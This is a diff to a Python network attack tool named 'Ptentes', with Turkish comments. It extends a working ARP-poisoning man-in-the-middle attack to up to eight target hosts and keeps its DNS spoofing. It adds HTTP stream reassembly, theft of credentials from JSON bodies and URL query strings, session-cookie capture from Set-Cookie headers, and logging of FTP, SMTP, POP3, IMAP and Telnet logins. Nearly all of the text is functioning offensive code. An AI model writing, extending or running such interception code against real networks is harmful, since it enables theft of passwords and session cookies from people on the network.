@@ -15,7 +15,9 @@ değişiklikleri geri alınır: durdurulduğunda ARP tablosu ve ip_forward eski
 hâline döner.
 """
 import atexit
+import base64
 import ipaddress
+import json
 import os
 import re
 import socket
@@ -33,8 +35,13 @@ PACKET_MR_PROMISC = 1
 
 MAX_EVENTS = 1500
 MAX_CREDS = 400
+MAX_COOKIES = 400
 MAX_DNS = 2000
 MAX_HOSTS = 500
+TLS_PORTS = frozenset((443, 8443, 4443, 9443))
+HTTP_PORTS = frozenset((80, 8080, 8000, 8888))
+CLEARTEXT_PORTS = frozenset((21, 23, 25, 110, 143, 587))
+MAX_ASM = 16384
 
 
 def _read(path, default=''):
@@ -184,6 +191,27 @@ USER_KEYS = ('user', 'username', 'login', 'email', 'mail', 'kullanici', 'kullan�
 PASS_KEYS = ('pass', 'password', 'pwd', 'parola', 'sifre', 'şifre')
 
 
+def parse_http_response(payload):
+    text = payload.decode('latin1', 'replace')
+    if not text.startswith('HTTP/'):
+        return None
+    head, _, _body = text.partition('\r\n\r\n')
+    lines = head.split('\r\n')
+    headers = {}
+    set_cookies = []
+    status = lines[0] if lines else ''
+    for ln in lines[1:]:
+        if ':' in ln:
+            k, v = ln.split(':', 1)
+            k = k.strip().lower()
+            v = v.strip()
+            if k == 'set-cookie':
+                set_cookies.append(v)
+            else:
+                headers[k] = v
+    return {'status': status, 'headers': headers, 'set_cookies': set_cookies}
+
+
 def parse_http(payload):
     text = payload.decode('latin1', 'replace')
     m = REQ_RE.match(text)
@@ -208,7 +236,6 @@ def http_credentials(req):
     auth = req['headers'].get('authorization', '')
     if auth.lower().startswith('basic '):
         try:
-            import base64
             raw = base64.b64decode(auth.split(None, 1)[1] + '===').decode('utf-8', 'replace')
             if ':' in raw:
                 out.append(('Basic auth', raw.split(':', 1)[0], raw.split(':', 1)[1]))
@@ -230,10 +257,98 @@ def http_credentials(req):
                 passwd = unquote_plus(fields[k][0])[:200]
         if user or passwd:
             out.append(('Form', user, passwd))
+    ctype = req['headers'].get('content-type', '')
+    if body and 'application/json' in ctype:
+        try:
+            data = json.loads(body[:8192])
+        except (json.JSONDecodeError, TypeError):
+            data = None
+        if isinstance(data, dict):
+            user = passwd = ''
+            for k, v in data.items():
+                if not isinstance(k, str):
+                    continue
+                lk = k.lower()
+                val = v if isinstance(v, str) else (v[0] if isinstance(v, list) and v else '')
+                if not isinstance(val, str):
+                    continue
+                if not user and any(lk == u or lk.endswith(u) for u in USER_KEYS):
+                    user = val[:200]
+                if not passwd and any(lk == p or lk.endswith(p) for p in PASS_KEYS):
+                    passwd = val[:200]
+            if user or passwd:
+                out.append(('JSON', user, passwd))
     return out
 
 
+def http_query_credentials(path):
+    """GET isteği sorgu dizisinden kullanıcı/parola çıkarır."""
+    if '?' not in path:
+        return []
+    try:
+        q = path.split('?', 1)[1]
+        fields = parse_qs(q[:4096], keep_blank_values=True)
+    except Exception:
+        return []
+    user = passwd = ''
+    for k in fields:
+        lk = k.lower()
+        if not user and any(lk == u or lk.startswith(u) for u in USER_KEYS):
+            user = unquote_plus(fields[k][0])[:200]
+        if not passwd and any(lk == p or lk.startswith(p) for p in PASS_KEYS):
+            passwd = unquote_plus(fields[k][0])[:200]
+    if user or passwd:
+        return [('Query', user, passwd)]
+    return []
+
+
+def http_set_cookies(set_cookie_lines):
+    """Set-Cookie başlıklarını (ad, değer) çiftlerine ayırır."""
+    out = []
+    for chunk in set_cookie_lines or []:
+        chunk = chunk.strip()
+        if not chunk:
+            continue
+        part = chunk.split(';', 1)[0]
+        if '=' not in part:
+            continue
+        name, val = part.split('=', 1)
+        name, val = name.strip(), val.strip()
+        if name:
+            out.append((name, val[:500]))
+    return out
+
+
+ECH_EXT = 0xFE0D
+
+
+def _parse_clienthello_ext(q, o, end):
+    """ClientHello uzantılarından SNI ve ECH bayrağı."""
+    sni, ech = None, False
+    ext_len = struct.unpack('!H', q[o:o + 2])[0]
+    o += 2
+    eend = min(len(q), o + ext_len, end)
+    while o + 4 <= eend:
+        etype, elen = struct.unpack('!HH', q[o:o + 4])
+        o += 4
+        if etype == ECH_EXT:
+            ech = True
+        elif etype == 0 and o + elen <= len(q):
+            e = q[o:o + elen]
+            if len(e) >= 5:
+                nlen = struct.unpack('!H', e[3:5])[0]
+                if 5 + nlen <= len(e):
+                    sni = e[5:5 + nlen].decode('latin1', 'replace')
+        o += elen
+    return sni, ech
+
+
 def tls_sni(payload):
+    meta = tls_clienthello_meta(payload)
+    return meta[0] if meta else None
+
+
+def tls_clienthello_meta(payload):
     try:
         if len(payload) < 44 or payload[0] != 0x16 or payload[5] != 0x01:
             return None
@@ -248,20 +363,23 @@ def tls_sni(payload):
         o += 2 + cs
         cm = q[o]
         o += 1 + cm
-        ext_len = struct.unpack('!H', q[o:o + 2])[0]
-        o += 2
-        end = min(len(q), o + ext_len)
-        while o + 4 <= end:
-            etype, elen = struct.unpack('!HH', q[o:o + 4])
-            o += 4
-            if etype == 0 and o + elen <= len(q):
-                e = q[o:o + elen]
-                if len(e) >= 5:
-                    nlen = struct.unpack('!H', e[3:5])[0]
-                    return e[5:5 + nlen].decode('latin1', 'replace')
-            o += elen
+        sni, ech = _parse_clienthello_ext(q, o, len(q))
+        return sni, ech
     except Exception:
         return None
+    return None
+
+
+def scan_quic_tls_sni(payload):
+    """QUIC Initial içindeki TLS ClientHello'dan SNI ara."""
+    if not payload or len(payload) < 48:
+        return None
+    lim = min(len(payload) - 44, 4096)
+    for i in range(lim):
+        if payload[i] == 0x16 and payload[i + 1] == 0x03 and payload[i + 5] == 0x01:
+            meta = tls_clienthello_meta(payload[i:])
+            if meta and meta[0]:
+                return meta
     return None
 
 
@@ -279,6 +397,7 @@ class Ptentes:
         self.error = None
         self.iface = ''
         self.target = ''
+        self.targets = []
         self.gateway = ''
         self.target_mac = ''
         self.gateway_mac = ''
@@ -290,16 +409,21 @@ class Ptentes:
         self.started = 0.0
         self.events = []
         self.creds = []
+        self.cookies = []
         self.dns_log = []
         self.hosts = {}
-        self.stats = {'packets': 0, 'bytes': 0, 'http': 0, 'tls': 0, 'dns': 0,
-                      'spoofed': 0, 'creds': 0, 'arp': 0}
+        self.stats = {'packets': 0, 'bytes': 0, 'http': 0, 'tls': 0, 'quic': 0, 'dns': 0,
+                      'spoofed': 0, 'creds': 0, 'cookies': 0, 'arp': 0, 'arp_warn': 0, 'ech': 0}
+        self._arp_warn_at = {}
         self.threads = []
         self.stop_ev = threading.Event()
         self._sock = None
         self._send = None
         self._ip_forward_prev = None
         self._ident = 0
+        self.session_label = ''
+        self.session_note = ''
+        self._tcp_asm = {}
 
     # ------------------------------------------------------------ yardımcı
     def _ident_next(self):
@@ -340,6 +464,19 @@ class Ptentes:
                                'user': user, 'pass': passwd})
             self.stats['creds'] += 1
 
+    def _add_cookie(self, host, name, value, src_ip):
+        with self.lock:
+            for c in self.cookies:
+                if c['host'] == host and c['name'] == name and c['value'] == value:
+                    c['t'] = round(time.time(), 3)
+                    c['src'] = src_ip
+                    return
+            if len(self.cookies) >= MAX_COOKIES:
+                del self.cookies[:80]
+            self.cookies.append({'t': round(time.time(), 3), 'host': host, 'name': name,
+                                 'value': value, 'src': src_ip})
+            self.stats['cookies'] += 1
+
     def _dns_target(self, host):
         host = host.lower().rstrip('.')
         if host in self.dns_map:
@@ -360,13 +497,25 @@ class Ptentes:
                 return {'ok': False, 'error': 'ARP zehirleme için root gerekir: sudo python3 packetlens.py'}
 
             iface = (cfg.get('iface') or '').strip()
+            raw_targets = cfg.get('targets') or []
+            if isinstance(raw_targets, str):
+                raw_targets = [x.strip() for x in raw_targets.replace(';', ',').split(',') if x.strip()]
             target = (cfg.get('target') or '').strip()
-            if not iface or not target:
-                return {'ok': False, 'error': 'Arayüz ve hedef IP zorunlu.'}
-            try:
-                ipaddress.IPv4Address(target)
-            except Exception:
-                return {'ok': False, 'error': 'Geçersiz hedef IP: %s' % target}
+            if not raw_targets and target:
+                raw_targets = [target]
+            targets = []
+            for t in raw_targets:
+                try:
+                    ipaddress.IPv4Address(t)
+                except Exception:
+                    return {'ok': False, 'error': 'Geçersiz hedef IP: %s' % t}
+                if t not in targets:
+                    targets.append(t)
+            if len(targets) > 8:
+                return {'ok': False, 'error': 'En fazla 8 hedef cihaz seçilebilir.'}
+            if not iface or not targets:
+                return {'ok': False, 'error': 'Arayüz ve en az bir hedef IP zorunlu.'}
+            target = targets[0]
 
             info = iface_info(iface)
             if not info['mac'] or not info['ip']:
@@ -378,8 +527,11 @@ class Ptentes:
                 net = ipaddress.IPv4Network('%s/%s' % (info['ip'], info['mask']), strict=False)
             except Exception:
                 return {'ok': False, 'error': 'Alt ağ hesaplanamadı.'}
-            if ipaddress.IPv4Address(target) not in net:
-                return {'ok': False, 'error': 'Hedef %s, %s ağında değil (%s).' % (target, net, info['ip'])}
+            for t in targets:
+                if ipaddress.IPv4Address(t) not in net:
+                    return {'ok': False, 'error': 'Hedef %s, %s ağında değil (%s).' % (t, net, info['ip'])}
+                if t == info['ip']:
+                    return {'ok': False, 'error': 'Hedef bu makinenin kendi IP adresi olamaz: %s' % t}
 
             gw_ip = (cfg.get('gateway') or '').strip()
             if not gw_ip:
@@ -390,18 +542,22 @@ class Ptentes:
                 ipaddress.IPv4Address(gw_ip)
             except Exception:
                 return {'ok': False, 'error': 'Geçersiz ağ geçidi: %s' % gw_ip}
-            if gw_ip == target:
-                return {'ok': False, 'error': 'Hedef ile ağ geçidi aynı olamaz.'}
-            if gw_ip in (info['ip'], target):
-                return {'ok': False, 'error': 'Ağ geçidi bu makine ya da hedefin kendisi.'}
+            if gw_ip in targets:
+                return {'ok': False, 'error': 'Ağ geçidi hedef listesinde olamaz.'}
+            if gw_ip == info['ip']:
+                return {'ok': False, 'error': 'Ağ geçidi bu makinenin IP adresi olamaz.'}
 
             self._reset()
             self.iface, self.target, self.gateway = iface, target, gw_ip
+            self.targets = []
             self.my_mac, self.my_ip = info['mac'], info['ip']
             self.spoof_dns = bool(cfg.get('dns_spoof', True))
             self.forward = bool(cfg.get('forward', True))
             self.dns_map = {str(k).lower().rstrip('.'): str(v) for k, v in (cfg.get('dns_map') or {}).items()
                             if str(k).strip() and _valid_ip(str(v))}
+            self.session_label = str(cfg.get('session_label') or '')[:120]
+            self.session_note = str(cfg.get('session_note') or '')[:2000]
+            self._tcp_asm = {}
 
             try:
                 self._sock = self._open_socket(iface)
@@ -413,14 +569,17 @@ class Ptentes:
                 self._close()
                 return {'ok': False, 'error': 'Arayüz açılamadı: %s' % e}
 
-            self.target_mac = self._resolve_mac(target, info['mac'], info['ip'])
             self.gateway_mac = self._resolve_mac(gw_ip, info['mac'], info['ip'])
-            if not self.target_mac:
-                self._close()
-                return {'ok': False, 'error': 'Hedefin MAC adresi bulunamadı: %s' % target}
             if not self.gateway_mac:
                 self._close()
                 return {'ok': False, 'error': 'Ağ geçidinin MAC adresi bulunamadı: %s' % gw_ip}
+            for t in targets:
+                tmac = self._resolve_mac(t, info['mac'], info['ip'])
+                if not tmac:
+                    self._close()
+                    return {'ok': False, 'error': 'Hedefin MAC adresi bulunamadı: %s' % t}
+                self.targets.append({'ip': t, 'mac': tmac})
+            self.target_mac = self.targets[0]['mac']
 
             if self.forward:
                 self._ip_forward_prev = _read('/proc/sys/net/ipv4/ip_forward', '0')
@@ -429,12 +588,14 @@ class Ptentes:
             self.stop_ev.clear()
             self.running = True
             self.started = time.time()
-            self._event('start', target, gw_ip, 'ARP zehirleme başladı (%s üzerinden)' % iface, 'ok')
+            tgt_label = ', '.join(targets) if len(targets) > 1 else target
+            self._event('start', tgt_label, gw_ip, 'ARP zehirleme başladı (%s üzerinden, %d hedef)' % (iface, len(targets)), 'ok')
             for fn in (self._arp_loop, self._sniff_loop):
                 t = threading.Thread(target=fn, daemon=True)
                 t.start()
                 self.threads.append(t)
-            return {'ok': True, 'target_mac': self.target_mac, 'gateway_mac': self.gateway_mac}
+            return {'ok': True, 'target_mac': self.target_mac, 'gateway_mac': self.gateway_mac,
+                    'targets': list(self.targets)}
 
     def _open_socket(self, iface):
         s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
@@ -474,15 +635,17 @@ class Ptentes:
 
     # ------------------------------------------------------------ ARP döngüsü
     def _arp_loop(self):
-        tmac, gmac = mac_bytes(self.target_mac), mac_bytes(self.gateway_mac)
+        gmac = mac_bytes(self.gateway_mac)
         mymac = mac_bytes(self.my_mac)
+        pairs = [(mac_bytes(t['mac']), t['ip']) for t in self.targets] or [(mac_bytes(self.target_mac), self.target)]
         while not self.stop_ev.is_set():
             try:
-                # hedefe: "ağ geçidi benim" · ağ geçidine: "hedef benim"
-                self._send.send(arp_reply(tmac, mymac, self.gateway, tmac, self.target))
-                self._send.send(arp_reply(gmac, mymac, self.target, gmac, self.gateway))
+                for tmac, tip in pairs:
+                    # hedefe: "ağ geçidi benim" · ağ geçidine: "hedef benim"
+                    self._send.send(arp_reply(tmac, mymac, self.gateway, tmac, tip))
+                    self._send.send(arp_reply(gmac, mymac, tip, gmac, self.gateway))
                 with self.lock:
-                    self.stats['arp'] += 2
+                    self.stats['arp'] += 2 * len(pairs)
             except OSError:
                 pass
             self.stop_ev.wait(1.8)
@@ -512,8 +675,14 @@ class Ptentes:
             if len(frame) >= 42:
                 op = struct.unpack('!H', frame[20:22])[0]
                 if op in (1, 2):
+                    sha = mac_str(frame[22:28])
                     spa = socket.inet_ntoa(frame[28:32])
-                    self._learn(spa, mac_str(frame[22:28]))
+                    self._learn(spa, sha)
+                    if self.running and op == 2 and sha != self.my_mac:
+                        self._arp_conflict(spa, sha)
+            return
+        if etype == 0x86DD and len(frame) >= 54:
+            self._icmpv6_ndp(frame[14:])
             return
         if etype != ETH_IP:
             return
@@ -540,42 +709,153 @@ class Ptentes:
                 h['packets'] += 1
                 h['bytes'] += len(frame)
 
-        if proto == UDP and len(seg) >= 8:
+        if proto == 1 and len(seg) >= 8:
+            self._icmp(src_ip, dst_ip, seg)
+        elif proto == UDP and len(seg) >= 8:
             sport, dport, ulen = struct.unpack('!HHH', seg[:6])
             payload = seg[8:min(ulen, len(seg))]
             if dport == 53 or sport == 53:
                 self._dns(src_ip, dst_ip, sport, dport, payload, mac_str(src_mac))
+            elif dport == 443 or sport == 443:
+                qm = scan_quic_tls_sni(payload)
+                if qm:
+                    name, ech = qm[0], qm[1]
+                    with self.lock:
+                        self.stats['quic'] += 1
+                        if ech:
+                            self.stats['ech'] += 1
+                    detail = 'QUIC SNI: %s' % name
+                    if ech:
+                        detail += ' (ECH)'
+                    self._event('quic', src_ip, name, detail)
+                    self._learn(name, '')
         elif proto == TCP and len(seg) >= 20:
             sport, dport, off_flags = struct.unpack('!HHI', seg[:8])
             doff = (off_flags >> 12) * 4
             payload = seg[doff:]
             if not payload:
                 return
-            if 80 in (sport, dport) or 8080 in (sport, dport):
-                self._http(src_ip, dst_ip, sport, dport, payload)
-            elif 443 in (sport, dport) and dport == 443:
-                name = tls_sni(payload)
-                if name:
-                    with self.lock:
-                        self.stats['tls'] += 1
-                    self._event('tls', src_ip, name, 'TLS bağlantısı: %s' % name)
-                    self._learn(name, '')
+            if sport in HTTP_PORTS or dport in HTTP_PORTS:
+                self._http_asm(src_ip, dst_ip, sport, dport, payload)
+            elif sport in CLEARTEXT_PORTS or dport in CLEARTEXT_PORTS:
+                self._cleartext(src_ip, dst_ip, sport, dport, payload)
+            elif sport in TLS_PORTS or dport in TLS_PORTS:
+                if payload and payload[0] == 0x16:
+                    meta = tls_clienthello_meta(payload)
+                    if meta and meta[0]:
+                        name, ech = meta
+                        with self.lock:
+                            self.stats['tls'] += 1
+                            if ech:
+                                self.stats['ech'] += 1
+                        detail = 'TLS bağlantısı: %s' % name
+                        if ech:
+                            detail += ' (ECH)'
+                        self._event('tls', src_ip, name, detail)
+                        self._learn(name, '')
+
+    def _arp_conflict(self, spa, sha):
+        """Hedef veya ağ geçidi gerçek MAC ile geri bildirildiğinde uyar (ARP savaşı / DAI)."""
+        if spa == self.gateway and sha != self.gateway_mac:
+            role, legit = 'gateway', self.gateway_mac
+        else:
+            hit = next((t for t in self.targets if t['ip'] == spa and sha != t['mac']), None)
+            if not hit:
+                if spa == self.target and sha != self.target_mac:
+                    role, legit = 'target', self.target_mac
+                else:
+                    return
+            else:
+                role, legit = 'target', hit['mac']
+        key = spa + '|' + sha
+        now = time.time()
+        with self.lock:
+            if now - self._arp_warn_at.get(key, 0) < 8:
+                return
+            self._arp_warn_at[key] = now
+            self.stats['arp_warn'] += 1
+        self._event('arp-conflict', spa, sha,
+                    '%s için rakip ARP: %s (beklenen %s) — izolasyon veya DAI olabilir' % (role, sha, legit),
+                    'warn')
+
+    def _icmp(self, src_ip, dst_ip, seg):
+        if len(seg) < 8:
+            return
+        typ, code = seg[0], seg[1]
+        target_ips = {t['ip'] for t in self.targets} or {self.target}
+        watch = src_ip in target_ips or dst_ip in target_ips
+        if not watch:
+            return
+        if typ == 8:
+            self._event('icmp', src_ip, dst_ip, 'Echo isteği (ping)', 'info')
+        elif typ == 0:
+            self._event('icmp', src_ip, dst_ip, 'Echo yanıtı', 'info')
+        elif typ == 11:
+            self._event('icmp', src_ip, dst_ip, 'TTL aşımı (traceroute olabilir)', 'warn')
+        elif typ == 3:
+            self._event('icmp', src_ip, dst_ip, 'ICMP hata kod=%d' % code, 'warn')
+
+    def _icmpv6_ndp(self, p):
+        if len(p) < 48 or p[6] != 58:
+            return
+        off = 40
+        if off >= len(p):
+            return
+        typ = p[off]
+        if typ in (133, 134, 135, 136):
+            self._event('ndp', socket.inet_ntop(socket.AF_INET6, p[8:24]), typ, 'IPv6 komşu keşfi (NDP)', 'info')
+
+    def _http_asm(self, src_ip, dst_ip, sport, dport, payload):
+        key = (src_ip, sport, dst_ip, dport)
+        buf = self._tcp_asm.get(key, b'') + payload
+        if len(buf) > MAX_ASM:
+            buf = buf[-MAX_ASM:]
+        self._tcp_asm[key] = buf
+        if b'\r\n\r\n' not in buf and len(buf) < 400:
+            return
+        self._http(src_ip, dst_ip, sport, dport, buf)
+        if b'\r\n\r\n' in buf:
+            del self._tcp_asm[key]
+
+    def _cleartext(self, src_ip, dst_ip, sport, dport, payload):
+        text = payload.decode('latin1', 'replace')
+        port = dport if dport in CLEARTEXT_PORTS else sport
+        if port == 21:
+            for line in text.split('\n'):
+                if line.upper().startswith('USER '):
+                    self._event('ftp', src_ip, dst_ip, line.strip()[:120], 'warn')
+                if line.upper().startswith('PASS '):
+                    self._event('ftp', src_ip, dst_ip, 'FTP PASS (gizlendi)', 'bad')
+        elif port in (25, 587):
+            if 'AUTH PLAIN' in text.upper():
+                self._event('smtp', src_ip, dst_ip, 'SMTP AUTH PLAIN', 'bad')
+        elif port == 110 and text.upper().startswith('USER '):
+            self._event('pop3', src_ip, dst_ip, text.strip()[:80], 'warn')
+        elif port == 143 and ' LOGIN ' in text.upper():
+            self._event('imap', src_ip, dst_ip, 'IMAP LOGIN', 'bad')
+        elif port == 23:
+            self._event('telnet', src_ip, dst_ip, 'Telnet oturumu (düz metin)', 'bad')
 
     def _dns(self, src_ip, dst_ip, sport, dport, payload, src_mac):
         parsed = dns_parse(payload)
         if not parsed:
             return
         txid, flags, name, qtype, _end = parsed
-        if flags & 0x8000:
-            return  # yanıt
+        is_resp = bool(flags & 0x8000)
+        rcode = (flags >> 4) & 0xF if is_resp else None
         if not name:
             return
         with self.lock:
             self.stats['dns'] += 1
-            self.dns_log.append({'t': round(time.time(), 3), 'client': src_ip, 'name': name,
-                                 'qtype': qtype, 'spoofed': False})
+            self.dns_log.append({'t': round(time.time(), 3), 'client': src_ip if not is_resp else dst_ip,
+                                 'name': name, 'qtype': qtype, 'spoofed': False, 'rcode': rcode,
+                                 'response': is_resp})
             if len(self.dns_log) > MAX_DNS:
                 del self.dns_log[:500]
+        if is_resp:
+            if rcode == 3:
+                self._event('dns-nx', dst_ip, name, 'NXDOMAIN: %s' % name, 'warn')
+            return
 
         target_ip = self._dns_target(name) if self.spoof_dns else None
         if target_ip and dport == 53:
@@ -599,15 +879,25 @@ class Ptentes:
 
     def _http(self, src_ip, dst_ip, sport, dport, payload):
         req = parse_http(payload)
-        if not req:
+        if req:
+            host = req['headers'].get('host', dst_ip if dport in HTTP_PORTS else src_ip)
+            with self.lock:
+                self.stats['http'] += 1
+            self._event('http', src_ip, host, '%s %s%s' % (req['method'], host, req['path']), 'info')
+            for proto, user, passwd in http_credentials(req):
+                self._add_cred(host, proto, user, passwd)
+                self._event('cred', src_ip, host, '%s kimlik bilgisi: %s' % (proto, user or '—'), 'bad')
+            for proto, user, passwd in http_query_credentials(req['path']):
+                self._add_cred(host, proto, user, passwd)
+                self._event('cred', src_ip, host, '%s kimlik bilgisi: %s' % (proto, user or '—'), 'bad')
             return
-        host = req['headers'].get('host', dst_ip)
-        with self.lock:
-            self.stats['http'] += 1
-        self._event('http', src_ip, host, '%s %s%s' % (req['method'], host, req['path']), 'info')
-        for proto, user, passwd in http_credentials(req):
-            self._add_cred(host, proto, user, passwd)
-            self._event('cred', src_ip, host, '%s kimlik bilgisi: %s' % (proto, user or '—'), 'bad')
+        resp = parse_http_response(payload)
+        if not resp:
+            return
+        host = src_ip if sport in HTTP_PORTS else dst_ip
+        for name, val in http_set_cookies(resp.get('set_cookies')):
+            self._add_cookie(host, name, val, src_ip)
+            self._event('cookie', src_ip, host, 'Set-Cookie: %s' % name, 'warn')
 
     # ------------------------------------------------------------ durum
     def status(self):
@@ -617,6 +907,7 @@ class Ptentes:
                 'error': self.error,
                 'iface': self.iface,
                 'target': self.target,
+                'targets': list(self.targets),
                 'gateway': self.gateway,
                 'target_mac': self.target_mac,
                 'gateway_mac': self.gateway_mac,
@@ -625,11 +916,15 @@ class Ptentes:
                 'dns_spoof': self.spoof_dns,
                 'forward': self.forward,
                 'dns_map': self.dns_map,
+                'session_label': self.session_label,
+                'session_note': self.session_note,
+                'target_ips': [t['ip'] for t in self.targets] or ([self.target] if self.target else []),
                 'started': self.started,
                 'uptime': round(time.time() - self.started, 1) if self.started else 0,
                 'stats': dict(self.stats),
                 'events': list(self.events),
                 'creds': list(self.creds),
+                'cookies': list(self.cookies),
                 'dns': list(self.dns_log),
                 'hosts': sorted(self.hosts.values(), key=lambda h: h['last'], reverse=True),
                 'platform': sys.platform,
@@ -644,7 +939,7 @@ class Ptentes:
 
     def report(self):
         st = self.status()
-        return {'tool': 'ptentes', 'generated': time.time(), 'session': st}
+        return {'tool': 'ptentes', 'generated': time.time(), 'session': st, 'label': self.session_label, 'note': self.session_note}
 
     # ------------------------------------------------------------ durdur
     def stop(self):
@@ -655,13 +950,15 @@ class Ptentes:
         for t in list(self.threads):
             t.join(timeout=1.5)
         self.threads = []
-        if was_running and self._send and self.target_mac and self.gateway_mac:
+        if was_running and self._send and self.gateway_mac:
             # Doğru eşlemeleri geri gönder: ağ sessizce eski hâline dönsün.
             try:
-                tmac, gmac = mac_bytes(self.target_mac), mac_bytes(self.gateway_mac)
+                gmac = mac_bytes(self.gateway_mac)
+                pairs = [(mac_bytes(t['mac']), t['ip']) for t in self.targets] or [(mac_bytes(self.target_mac), self.target)]
                 for _ in range(5):
-                    self._send.send(arp_reply(tmac, gmac, self.gateway, tmac, self.target))
-                    self._send.send(arp_reply(gmac, tmac, self.target, gmac, self.gateway))
+                    for tmac, tip in pairs:
+                        self._send.send(arp_reply(tmac, gmac, self.gateway, tmac, tip))
+                        self._send.send(arp_reply(gmac, tmac, tip, gmac, self.gateway))
                     time.sleep(0.15)
             except OSError:
                 pass
